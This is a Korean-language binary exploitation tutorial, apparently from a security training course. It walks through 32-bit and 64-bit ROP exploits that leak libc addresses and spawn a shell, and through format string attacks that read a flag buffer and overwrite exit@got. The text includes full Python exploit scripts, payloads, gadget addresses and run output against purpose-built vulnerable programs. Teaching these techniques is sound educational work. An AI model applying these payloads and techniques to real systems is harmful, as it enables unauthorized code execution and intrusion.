이렇듯 동적으로 변화하는 아스키 범위 밖의 문자를 읽기 위해 공격 코드를 스크립트로 작성할 필요가 있습니다. 파이썬를 이용해 공격 코드를 작성해 보도록 하겠습니다. 오른쪽 코드는 puts 함수를 호출해 scanf@got의 메모리를 가져오는 파이썬 스크립트입니다.

```
#!/usr/bin/python2.7
'''
example4_leak.py
'''
import struct
import subprocess
import os
import pty
def readline(fd):
  res = ''
  try:
    while True:
      ch = os.read(fd, 1)
      res += ch
      if ch == '\n':
        return res
  except:
    raise
def writeline(proc, data):
  try:
    proc.stdin.write(data + '\n')
  except:
    raise
def p32(val):
  return struct.pack("<I", val)
def u32(data):
  return struct.unpack("<I", data)[0]
out_r, out_w = pty.openpty()
s = subprocess.Popen("./example4", stdin=subprocess.PIPE, stdout=out_w)
print `readline(out_r)`     # Hello World!\n
print `readline(out_r)`     # Hello ASLR!\n
payload  = "A"*36           # buf padding
payload += p32(0x8048326)   # ret addr (puts@plt + 6)
payload += p32(0xdeadbeef)  # ret after puts
payload += p32(0x804a014)   # scanf@got
writeline(s, payload)
out = readline(out_r)     # memory leakage of scanf@got
print `out`
scanf_addr = u32(out[:4])
print "scanf @ " + hex(scanf_addr)
```


```
$ python example4_leak.py
'Hello World!\r\n'
'Hello ASLR!\r\n'
'\xc0\xe0\xe2\xf7\r\n'
scanf @ 0xf7e2e0c0
```

스크립트를 실행하면 example4로부터 scanf의 주소를 구해 출력하는 것을 볼 수 있습니다.

구한 scanf의 주소와 libc 베이스 주소로부터 scanf 함수 주소까지의 오프셋을 이용해 libc의 베이스 주소를 구할 수 있습니다.

```
libc 베이스 주소 = scanf 주소 - libc 베이스 주소로부터 scanf 주소까지의 오프셋
```


readelf를 이용해 libc.so.6 파일에서 scanf 함수의 오프셋을 구할 수 있습니다.

```
$ readelf -s /lib/i386-linux-gnu/libc.so.6 | grep scanf
   424: 0005c0c0   258 FUNC    GLOBAL DEFAULT   13 __isoc99_scanf@@GLIBC_2.7
```

```
libc 베이스 주소 = scanf 주소 - 0x5c0c0
```



릭된 libc.so.6 라이브러리 주소를 이용하여 셸을 얻어보겠습니다.

익스플로잇에서는 ROP를 통해 scanf 함수를 호출해 scanf@got에는 system 함수의 주소를, scanf@got+4에는 "/bin/sh" 문자열을 입력한 후 scanf@plt 를 호출하여 최종적으로 system("/bin/sh")를 실행합니다.

ROP 체인에서 함수를 호출할 때, 다음 체인을 실행하기 위해 esp 레지스터를 호출한 함수의 인자 다음으로 가리키게 해주어야 합니다.

objdump를 이용해 pop; pop; ret 코드 가젯을 찾아보도록 하겠습니다.

```
$ objdump -d ./example4 | grep -A3 pop
 804830d:	5b                   	pop    %ebx
 804830e:	c3                   	ret    
Disassembly of section .plt:
--
 8048362:	5e                   	pop    %esi
 8048363:	89 e1                	mov    %esp,%ecx
 8048365:	83 e4 f0             	and    $0xfffffff0,%esp
 8048368:	50                   	push   %eax
--
 8048518:	5b                   	pop    %ebx
 8048519:	5e                   	pop    %esi
 804851a:	5f                   	pop    %edi
 804851b:	5d                   	pop    %ebp
 804851c:	c3                   	ret    
 804851d:	8d 76 00             	lea    0x0(%esi),%esi
--
 8048536:	5b                   	pop    %ebx
 8048537:	c3                   	ret    
```

objdump의 결과를 보면 0x804851a 주소에 pop; pop; ret 코드 가젯이 존재하는 것을 알 수 있습니다

example4.py에서는 pop; pop; ret 코드 가젯(line 43 ~ 45)을 이용하여 esp 레지스터를 scanf 함수의 인자 2개 이후 주소로 가리키게 해주었습니다.

```
#!/usr/bin/python
'''
example4.py
'''
import struct
import subprocess
import os
import pty
import time
def readline(fd):
  res = ''
  try:
    while True:
      ch = os.read(fd, 1)
      res += ch
      if ch == '\n':
        return res
  except:
    raise
def read(fd, n):
  return os.read(fd, n)
def writeline(proc, data):
  try:
    proc.stdin.write(data + '\n')
  except:
    raise
def p32(val):
  return struct.pack("<I", val)
def u32(data):
  return struct.unpack("<I", data)[0]
out_r, out_w = pty.openpty()    # to ignore buffer
s = subprocess.Popen("./example4", stdin=subprocess.PIPE, stdout=out_w)
'''
0x804851a <__libc_csu_init+90>:  pop    %edi
0x804851b <__libc_csu_init+91>:  pop    %ebp
0x804851c <__libc_csu_init+92>:  ret    
'''
pop_pop_ret = 0x804851a
pop_ret = pop_pop_ret + 1
scanf_plt = 0x8048340
puts_plt = 0x8048320
puts_got = 0x804a00c
string_fmt = 0x8048559      # "%s"
scanf_got = 0x804a014
print `readline(out_r)`     # Hello World!\n
print `readline(out_r)`     # Hello ASLR!\n
payload  = "A"*36           # buf padding
payload += p32(puts_plt + 6)   # ret addr (puts@plt + 6)
payload += p32(pop_ret)  # ret after puts
payload += p32(scanf_got)   # scanf@got
payload += p32(scanf_plt)
payload += p32(pop_pop_ret)
payload += p32(string_fmt)
payload += p32(scanf_got)
payload += p32(scanf_plt)
payload += p32(0xdeadbeef)
payload += p32(scanf_got+4)
print `payload`
writeline(s, payload)
libc = u32(readline(out_r)[:4]) - 0x5c0c0
system = libc + 0x3ada0
print "libc @ " + hex(libc)
print "system @ " + hex(system)
writeline(s, p32(system)+"/bin/sh\x00")
print "[+] get shell"
while True:
  cmd = raw_input("$ ")
  writeline(s, cmd)
  time.sleep(0.2)
  print read(out_r, 1024)

```

![](https://i.imgur.com/yyi7WAa.png)

example4.py를 실행하면 셸을 성공적으로 획득한 것을 볼 수 있습니다.


```
$ python example4.py
'Hello World!\r\n'
'Hello ASLR!\r\n'
'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&\x83\x04\x08\x1b\x85\x04\x08\x14\xa0\x04\x08@\x83\x04\x08\x1a\x85\x04\x08Y\x85\x04\x08\x14\xa0\x04\x08@\x83\x04\x08\xef\xbe\xad\xde\x18\xa0\x04\x08'
libc @ 0xf7d5b000
system @ 0xf7d95da0
[+] get shell
$ echo "SHELL_TEST"
SHELL_TEST
$ ls -al /etc/passwd
-rw-r--r-- 1 root root 2434 Oct 17 22:18 /etc/passwd
```


# 64 bit ROP

32비트 아키텍쳐에서는 함수 호출시 인자를 스택에 저장하는 반면 64비트 아키텍쳐에서는 함수의 인자를 레지스터와 스택에 저장해 전달합니다.
```
// gcc -o call64 call64.c 
#include <stdio.h>
int main()
{
	printf("%d + %d = %d\n %d + %d = %d\n",1,2,3,4,5,9);
	return 0;
}
```


call64.c는 64비트 아키텍쳐의 함수 호출 규약을 확인하기 위해 printf 함수에 7개의 인자를 전달하여 호출하는 코드입니다.

다음은 call64의 디스어셈블리 결과입니다.

```
$ gdb call64
(gdb) disas main
Dump of assembler code for function main:
   0x0000000000400526 <+0>:	push   rbp
   0x0000000000400527 <+1>:	mov    rbp,rsp
   0x000000000040052a <+4>:	sub    rsp,0x8
   0x000000000040052e <+8>:	push   0x9
   0x0000000000400530 <+10>:	mov    r9d,0x5
   0x0000000000400536 <+16>:	mov    r8d,0x4
   0x000000000040053c <+22>:	mov    ecx,0x3
   0x0000000000400541 <+27>:	mov    edx,0x2
   0x0000000000400546 <+32>:	mov    esi,0x1
   0x000000000040054b <+37>:	mov    edi,0x4005f4
   0x0000000000400550 <+42>:	mov    eax,0x0
   0x0000000000400555 <+47>:	call   0x400400 <printf@plt>
(gdb) x/s 0x4005f4
0x4005f4:	"%d + %d = %d\n %d + %d = %d\n"
```

printf 함수 호출 이전에 인자를 각각 레지스터와 스택에 넣고 호출합니다. 디스어셈블리 결과를 보면 64비트에서 함수가 호출될 때 전달되는 인자는 다음과 같습니다.

![](https://i.imgur.com/jXNxnfU.png)


rdi,rsi,rdx,rcx,r8,r9 레지스터를 전부 사용하면 다음 인자부터는 스택에 저장합니다. 64비트 아키텍쳐에서는 pop과 같은 명령어를 통해 함수의 인자를 전달하는 방법으로 ROP를 할 수 있습니다.

```
// gcc -o rop64 rop64.c -fno-stack-protector
#include <stdio.h>
#include <unistd.h>
void gadget() {
	asm("pop %rdi");
	asm("pop %rsi");
	asm("pop %rdx");
	asm("ret");
}
int main()
{
	char buf[256];
	write(1, "Data: ", 6);
	read(0, buf, 1024); 
	return 0;
}
```

rop64.c에는 스택 버퍼 오버플로우 취약점이 존재합니다. 익스플로잇의 편의를 위해 rdi,rsi,rdx 레지스터에 각각 원하는 값을 전달할 수 있는 ROP 코드 가젯을 제공했습니다.

공격 코드를 작성하기에 앞서 objdump를 사용하여 pop rdi; pop rsi; pop rdx; ret 코드 가젯의 주소를 알아내야 합니다.

```
$ objdump -d rop64 | grep "gadget" -A6
0000000000400566 <gadget>:
  400566:	55                   	push   %rbp
  400567:	48 89 e5             	mov    %rsp,%rbp
  40056a:	5f                   	pop    %rdi
  40056b:	5e                   	pop    %rsi
  40056c:	5a                   	pop    %rdx
  40056d:	c3                   	retq
```


해당하는 코드 가젯은 0x40056a 주소에 존재합니다. 찾은 코드 가젯을 이용해 write 함수를 호출한 뒤 write@got에 저장되어 있는 값을 출력해서 라이브러리 주소를 알아냅니다. 이후, 알아낸 라이브러리 주소를 통해 write@got를 system 함수로 덮어쓰고 "/bin/sh" 문자열을 입력합니다. 최종적으로 write 함수를 호출하고 "/bin/sh" 문자열의 주소인 0x601020를 첫 번째 인자로 전달하면 셸을 획득할 수 있습니다.


```
# rop64.py
import struct
import subprocess
import os
import pty
import time
def readline(fd):
  res = ''
  try:
    while True:
      ch = os.read(fd, 1)
      res += ch
      if ch == '\x20':
        return res
  except:
    raise
def read(fd, n):
  return os.read(fd, n)
def writeline(proc, data):
  try:
    proc.stdin.write(data + "\n")
  except:
    raise
def p64(val):
  return struct.pack("<Q", val)
def u64(data):
  return struct.unpack("<Q", data)[0]
out_r, out_w = pty.openpty()
s = subprocess.Popen("./rop64", stdin=subprocess.PIPE, stdout=out_w)
print `read(out_r, 6)`
# write(1, 0x601018, 8)
payload  = "A"*264         # buf padding
payload += p64(0x40056a)   # pop rdi; pop rsi; pop rdx; ret
payload += p64(1)          # fd
payload += p64(0x601018)   # write@got
payload += p64(8)          # 8 
payload += p64(0x400430)   # write_plt 
# read(0, 0x601018, 16)
payload += p64(0x40056a)   # pop rdi; pop rsi; pop rdx; ret
payload += p64(0)          # fd
payload += p64(0x601018)   # write@got
payload += p64(16)          # 8
payload += p64(0x400440)   # read@plt
# write(0x601020,0,0)
payload += p64(0x40056a)   # pop rdi; pop rsi; pop rdx; ret
payload += p64(0x601020)   # /bin/sh
payload += p64(0)          # 0
payload += p64(0)          # 0
payload += p64(0x400430)   # write@plt
writeline(s, payload)
```
라이브러리의 베이스 주소와 system 함수 주소를 계산하기 위해 readelf를 사용하여 오프셋을 알아내야 합니다.

```
$ readelf -a /lib/x86_64-linux-gnu/libc.so.6 | grep "write"
  W (write), A (alloc), X (execute), M (merge), S (strings), l (large)
    99: 00000000000746c0   466 FUNC    GLOBAL DEFAULT   13 _IO_wdo_write@@GLIBC_2.2.5
   169: 00000000000f72b0    90 FUNC    WEAK   DEFAULT   13 __write@@GLIBC_2.2.5
   287: 000000000007a390   269 FUNC    GLOBAL DEFAULT   13 _IO_do_write@@GLIBC_2.2.5
   491: 0000000000108040    36 FUNC    GLOBAL DEFAULT   13 process_vm_writev@@GLIBC_2.15
   493: 00000000000f5ac0    96 FUNC    WEAK   DEFAULT   13 __pwrite64@@GLIBC_2.2.5
   851: 00000000000fcfd0    90 FUNC    WEAK   DEFAULT   13 writev@@GLIBC_2.2.5
  1252: 00000000000f5ac0    96 FUNC    GLOBAL DEFAULT   13 __libc_pwrite@@GLIBC_PRIVATE
  1513: 00000000000fd0e0   170 FUNC    GLOBAL DEFAULT   13 pwritev@@GLIBC_2.10
  1565: 0000000000107700    41 FUNC    GLOBAL DEFAULT   13 eventfd_write@@GLIBC_2.7
  1580: 000000000006e6e0   456 FUNC    WEAK   DEFAULT   13 fwrite@@GLIBC_2.2.5
  1855: 00000000000fd0e0   170 FUNC    GLOBAL DEFAULT   13 pwritev64@@GLIBC_2.10
  2005: 0000000000078b70   171 FUNC    GLOBAL DEFAULT   13 _IO_file_write@@GLIBC_2.2.5
  2025: 000000000006e6e0   456 FUNC    GLOBAL DEFAULT   13 _IO_fwrite@@GLIBC_2.2.5
  2044: 00000000000f5ac0    96 FUNC    WEAK   DEFAULT   13 pwrite@@GLIBC_2.2.5
  2103: 00000000000781a0   106 FUNC    GLOBAL DEFAULT   13 fwrite_unlocked@@GLIBC_2.2.5
  2112: 00000000000f5ac0    96 FUNC    WEAK   DEFAULT   13 pwrite64@@GLIBC_2.2.5
  2159: 00000000000f72b0    90 FUNC    WEAK   DEFAULT   13 write@@GLIBC_2.2.5
$ readelf -a /lib/x86_64-linux-gnu/libc.so.6 | grep "system"
   225: 0000000000138810    70 FUNC    GLOBAL DEFAULT   13 svcerr_systemerr@@GLIBC_2.2.5
   584: 0000000000045390    45 FUNC    GLOBAL DEFAULT   13 __libc_system@@GLIBC_PRIVATE
  1351: 0000000000045390    45 FUNC    WEAK   DEFAULT   13 system@@GLIBC_2.2.5
```

라이브러리의 write와 system 함수 오프셋은 각각 0xf72b0, 0x45390인 것을 알아냈습니다.


출력된 write@got 값과 라이브러리의 write 함수 오프셋을 계산하여 라이브러리의 베이스 주소를 알아내고, system 함수 오프셋과 덧셈 연산을 하여 system 함수 주소를 알아냈습니다.

write@got에 입력받을 때 system 함수 주소와 "/bin/sh" 문자열을 입력하고, write 함수를 호출할 때 인자로 0x601020 주소를 전달하면 셸을 획득할 수 있습니다.


```
# rop64.py 
import struct
import subprocess
import os
import pty
import time
def readline(fd):
  res = ''
  try:
    while True:
      ch = os.read(fd, 1)
      res += ch
      if ch == '\x20':
        return res
  except:
    raise
def read(fd, n):
  return os.read(fd, n)
def writeline(proc, data):
  try:
    proc.stdin.write(data + "\n")
  except:
    raise
def p64(val):
  return struct.pack("<Q", val)
def u64(data):
  return struct.unpack("<Q", data)[0]
out_r, out_w = pty.openpty()
s = subprocess.Popen("./rop64", stdin=subprocess.PIPE, stdout=out_w)
print `read(out_r, 6)`
# write(1, 0x601010, 8)
payload  = "A"*264         # buf padding
payload += p64(0x40056a)   # pop rdi; pop rsi; pop rdx; ret
payload += p64(1)          # fd
payload += p64(0x601018)   # write@got
payload += p64(8)          # 8 
payload += p64(0x400430)   # write_plt 
# read(0, 0x601010, 16)
payload += p64(0x40056a)   # pop rdi; pop rsi; pop rdx; ret
payload += p64(0)          # fd
payload += p64(0x601018)   # write@got
payload += p64(16)          # 8
payload += p64(0x400440)   # read@plt
# write(0x601018,0,0)
payload += p64(0x40056a)   # pop rdi; pop rsi; pop rdx; ret
payload += p64(0x601020)   # /bin/sh
payload += p64(0)          # 0
payload += p64(0)          # 0
payload += p64(0x400430)   # write@plt
writeline(s, payload)
libc = u64(read(out_r,8)[:8])
base = libc - 0xf72b0
system = base + 0x45390
print hex(libc)
writeline(s, p64(system)+"/bin/sh\x00")
while True:
  cmd = raw_input("$ ")
  writeline(s, cmd)
  time.sleep(0.2)
  print read(out_r, 1024)

```

```
$ python ex.py
'Data: '
0x7f98a275c2b0
$ id
uid=1001(theori) gid=1001(theori) groups=1001(theori)
```



# 5. Format String Bug

포맷 스트링 버그는 대표적으로 printf와 sprintf와 같은 포맷 스트링을 사용하는 함수에서 사용자가 포맷 스트링 문자열을 통제할 수 있을 때 발생하는 취약점입니다. 이 취약점이 프로그램에 존재하면, 프로그램의 임의 주소의 값을 읽을 수 있을 뿐만 아니라 값을 쓸 수 있기 때문에 매우 위험합니다.

포맷 스트링에는 다양한 종류가 있고, 주어진 인자에 대해 각 포맷 별로 정해진 기능을 수행합니다. 만약 공격자가 이러한 포맷 스트링을 조작할 수 있다면, printf 함수의 인자가 저장되는 스택의 내용을 읽거나 %n 혹은 %s 등 메모리 참조 포맷 스트링을 이용해 메모리 커럽션을 유발할 수 있습니다.

fsb1은 중요 파일인 "flag" 파일을 읽고 전역 변수 flag_buf에 저장합니다. 그리고 지역 버퍼인 buf에 입력을 받고 printf를 사용하여 출력하되 사용자의 입력이 포맷 스트링으로 그대로 들어가기 때문에 포맷 스트링 버그가 발생합니다.

해당 예제의 목표는 flag_buf에 저장되어 있는 "flag" 파일의 내용을 포맷 스트링 버그를 통해 읽는 것입니다.


```
// gcc -o fsb1 fsb1.c -m32 -mpreferred-stack-boundary=2
#include <stdio.h>

int main()
{
	FILE *fp;
	char buf[256];
	initialize();
	memset(buf, 0, sizeof(buf));
	fp = fopen("./flag", "r");
	fread(flag_buf, 1, sizeof(flag_buf), fp);
	printf("Input: ");
	read(0, buf, sizeof(buf)-1);
	printf(buf);
	return 0;
}
```


우선 포맷 스트링 버그가 존재하면 포맷 스트링이 참조하는 버퍼에 공격자의 값을 쓸 수 있는지, 그리고 입력한 데이터가 몇 번째 포맷 스트링에 참조되는지를 먼저 알아내야 합니다. 공격자가 변조 가능한 데이터가 포맷 스트링에 의해 참조된다면 임의 주소에 값을 쓰거나 읽는 것이 가능해집니다.

fsb를 확인해보면 처음 입력 값 "AAAA"가 두 번째 포맷 스트링에 의해 참조되는 것을 확인할 수 있습니다. 해당 값은 printf가 호출될 때의 스택 포인터의 값을 확인하면 정확하게 알아낼 수 있습니다.

만약 처음에 입력한 4 바이트의 값이 특정 메모리 주소라면, 해당 포인터를 참조하는 포맷 스트링을 사용했을 때 입력한 주소에 값을 쓰거나 읽을 수 있습니다.

fsb_n을 보면 "AAAA%x.%n"을 입력했을 때 printf 함수가 실행되면서 프로그램이 비정상 종료한 것을 알 수 있습니다. 비정상 종료가 발생한 명령어와 레지스터를 gdb를 통해 확인해보면, 0x41414141이 "%n" 포맷 스트링을 통해 참조되어 값을 쓰다가 Segmentation fault가 발생되는 것을 알 수 있습니다.

이해를 돕기 위해 요약한 명령어는 다음과 같습니다.
```
mov    DWORD PTR [0x41414141], 0xc
```

만약 두 번째 값이 0x41414141이 아닌 메모리에 존재하는 주소라면 해당 영역에 값을 쓰거나 읽을 수 있습니다.

```
$ ./fsb1
Input: AAAA%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x 
AAAA9ca9008.41414141.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.a78252e.0
```

```
# gdb fsb1
(gdb) set disassembly-flavor intel
(gdb) r
Starting program: ./fsb1 
Input: AAAA%x.%n
Program received signal SIGSEGV, Segmentation fault.
0xf7e43369 in _IO_vfprintf_internal (s=0xffffafd4, format=<optimized out>, ap=0xffffd5b8 "%x.%n\n") at vfprintf.c:1631
1631	vfprintf.c: No such file or directory.
(gdb) x/i $eip
=> 0xf7e43369 <_IO_vfprintf_internal+8873>:	mov    DWORD PTR [eax],esi
(gdb) i r $eax $esi
eax            0x41414141	1094795585
esi            0xc	12
```

"%n" 포맷 스트링을 이용하면 원하는 주소를 참조하여 값을 쓸 수 있다는 것을 알았습니다. 그러나 fsb1에서는 전역 변수 flag_buf에 저장된 내용을 읽어야 합니다.

flag_buf의 주소는 심볼을 이용해 gdb에서 다음과 같이 알아낼 수 있습니다.

```
(gdb) info var flag_buf
All variables matching regular expression "flag_buf":
Non-debugging symbols:
0x0804a080  flag_buf
```

"%n" 포맷 스트링을 이용하면 원하는 주소를 참조하여 값을 쓸 수 있다는 것을 알았습니다. 그러나 fsb1에서는 전역 변수 flag_buf에 저장된 내용을 읽어야 합니다.

flag_buf의 주소는 심볼을 이용해 gdb에서 다음과 같이 알아낼 수 있습니다.

```
(gdb) info var flag_buf
All variables matching regular expression "flag_buf":
Non-debugging symbols:
0x0804a080  flag_buf
```

입력의 첫 4 바이트에 0x804a080 주소를 입력하여 두 번째 포맷 스트링을 참조할 때 해당 주소를 참조하도록 합니다.

특정 문자열을 출력할 때는 "%s" 포맷 스트링을 사용하여 다음과 같이 지정된 주소의 문자열을 출력할 수 있습니다.

printf("%s", "HELLO WORLD")

만약 "[flag_buf 주소].%x.%s"을 삽입한다면 "%s" 포맷 스트링을 처리할 때 printf("%s", 0x804a080)의 결과를 출력할 것입니다.

fsb1_exploit을 확인해보면 성공적으로 "flag" 파일의 내용인 "DREAMHACK_FORMATSTRING" 문자열이 출력된 것을 확인할 수 있습니다.

만약 사용자가 입력한 값이 두 번째가 아닌 천 번째, 만 번째 포맷 스트링에서 참조할 수 있다면 해당 포인터를 참조하도록 많은 포맷 스트링을 입력해 접근해야 합니다. 그러나 이를 쉽게 해결하는 방법 또한 존재합니다.

fsb1_exploit2를 확인해보면 "[flag_buf 주소]%2$s"를 입력하였습니다. "%N$"는 N 번째 매개 변수를 특정 포맷 스트링으로 처리할 때 사용합니다. 예제에서 다룬 "%2$s"는 두 번째 주소를 "s" 포맷 스트링을 통해 출력한다는 의미입니다.

fsb_example.c는 "%N$"의 이해를 돕기 위한 간단한 예제입니다. 실행 결과는 다음과 같습니다.

```
$ ./ex
WORLD
```

이처럼 "$"를 사용하면 원하는 번지의 주소를 쉽게 참조할 수 있기 때문에 유용하게 사용할 수 있습니다.


```
(gdb) r <<< $(python -c 'print "\x80\xa0\x04\x08%x.%s"')
Starting program: ./fsb1 <<< $(python -c 'print "\x80\xa0\x04\x08%x.%s"')
Input: ?804b008.DREAMHACK_FORMATSTRING
```

```
(gdb) r <<< $(python -c 'print "\x80\xa0\x04\x08%2$s"')
Starting program: /mnt/hgfs/ubuntu/dreamhack/fsb1 <<< $(python -c 'print "\x80\xa0\x04\x08%2$s"')
Input: ?DREAMHACK_FORMATSTRING
```

```
#include <stdio.h>
int main()
{
	printf("%2$s", "HELLO", "WORLD");
}
```

포맷 스트링 버그를 통해 임의의 주소에 저장되어 있는 값을 읽어내는 방법을 다뤘습니다. 그렇다면 임의의 주소에 원하는 값을 쓰는 방법에 대해서 보다 자세히 알아보도록 하겠습니다.

fsb2는 포맷 스트링 버그가 발생하고 exit 함수가 호출되어 프로그램이 종료되는 예제입니다. exit 함수는 포맷 스트링 버그가 발생한 이후에 호출되기 때문에 exit@got를 조작할 수 있다면 주어진 get_shell 함수로 실행 흐름을 조작할 수 있습니다.

이전 예제를 살펴보면 "n" 포맷 스트링을 사용하면 출력된 문자열의 길이만큼 특정 주소에 값을 쓴다는 것을 확인할 수 있었습니다. 값을 쓰는 것 또한 이전 공격 방식과 비슷한 과정을 통해 수행할 수 있습니다.

```
// gcc -o fsb2 fsb2.c -m32 -mpreferred-stack-boundary=2
#include <stdio.h>
 
void get_shell() {
	system("/bin/sh");
}
int main()
{
	char buf[256];
	initialize();
	memset(buf, 0, sizeof(buf));
	printf("Input: ");
	read(0, buf, sizeof(buf)-1);
	printf(buf);
	exit(0);
}
```


```
// gcc -o fsb_example2 fsb_example2.c
#include <stdio.h>
int main()
{
	int ret = 0;
	printf("1234%1$n\n", &ret);
	printf("ret: %d\n", ret);
}
```

"n"은 출력된 문자의 길이 수를 전달된 매개 변수에 쓰는 포맷 스트링입니다.

fsb_example2는 "n" 포맷 스트링의 이해를 돕기 위한 예제입니다. 실행 결과는 다음과 같습니다.

```
# ./fsb_example2
1234
ret: 4
```

printf의 첫 번째 인자로는 "1234%1$n", 두 번째 인자에 ret 지역 변수의 주소를 전달했습니다. "1234" 문자열의 길이는 4이고, "%1$n" 포맷 스트링을 사용하여 ret에 출력된 문자열의 길이를 쓰기 때문에 ret은 4라는 값을 가지게 됩니다.

그러나 실제로 공격을 할 때는 이와 같이 작은 값을 쓸 경우는 적습니다. 만약 0x41414141이란 값을 쓰기 위해서는 문자열의 길이가 1094795585(0x41414141의 10 진수)이 되어야하는데, 입력할 수 있는 길이가 한정되어 있다면 fsb_example2에서 다룬 방법으로는 공격이 불가능 할 수 있습니다.

fsb_example3는 이를 해결할 수 있는 예제입니다.

```
// gcc -o fsb_example3 fsb_example3.c
#include <stdio.h>
int main()
{
	int ret = 0;
	printf("%1024c%1$n\n", &ret);
	printf("ret: %d\n", ret);
}
```

```
$ ./fsb_exmaple3
                                                        ?ret:1024                                                            
```
1024 바이트 길이의 데이터를 입력하지 않았는데 ret이 1024로 덮인 것을 확인할 수 있습니다.

"%1024c"는 1024 길이의 공백을 포함한 문자를 "c" 포맷 스트링으로 출력하는 것이기 때문에 이를 사용하여 원하는 길이만큼 화면에 문자를 출력할 수 있습니다. 해당 방법을 사용하면 입력할 수 있는 버퍼가 한정적이더라도 원하는 문자열의 길이를 출력하여 임의 주소에 원하는 값을 쓸 수 있습니다.

그럼 앞에서 배운 "%Nc"와 "n" 포맷 스트링을 사용하여 exit@got를 원하는 값으로 덮어써 보도록 하겠습니다. 우선 exit@got를 get_shell 주소로 덮어쓰기 위해 해당하는 주소를 구합니다.

```
(gdb) i func get_shell
All functions matching regular expression "get_shell":
Non-debugging symbols:
0x08048639  get_shell
(gdb) x/i exit
   0x8048490 <exit@plt>:	jmp    *0x804a024
```

fsb2_exploit1은 1024 바이트만큼 출력해 exit@got를 1024인 0x400 값으로 덮어쓰는 공격 코드입니다.

"exit@got주소%1024c%1$n" 포맷 스트링을 사용하여 덮어쓴 결과 1024 ( 0x400 )이 아닌 0x404 값이 덮어써진 것을 확인할 수 있습니다. 이러한 이유는 다음과 같습니다.

"n"은 출력한 문자열의 길이 값을 전달된 인자에 쓰는 포맷 스트링입니다. 공격 코드의 경우 "%1024c"를 통해 1024 바이트만큼을 출력했지만 앞 부분에 입력한 exit@got 주소, 즉 4 바이트가 포함되어 있기 때문에 1028인 0x404 값이 덮어써진 것입니다.
fsb2_exploit2는 exit@got 주소를 get_shell 주소로 덮어쓰는 공격 코드입니다. 이는 get_shell 주소인 134514233 바이트를 화면에 출력한 이후 값을 덮어쓰기 때문에 공격이 오래 걸리거나 TIMEOUT이 발생할 수 있습니다. exit@got 주소를 2 바이트, 혹은  1 바이트씩 덮어쓰면 됨
```
(gdb) r <<< $(python -c 'print "\x24\xa0\x04\x08%1024c%1$n"')
Starting program: ./fsb2 <<< $(python -c 'print "\x24\xa0\x04\x08%1024c%1$n"'
```

```
$ (python -c 'print "\x24\xa0\x04\x08%134514229c%1$n"') | ./fsb2
```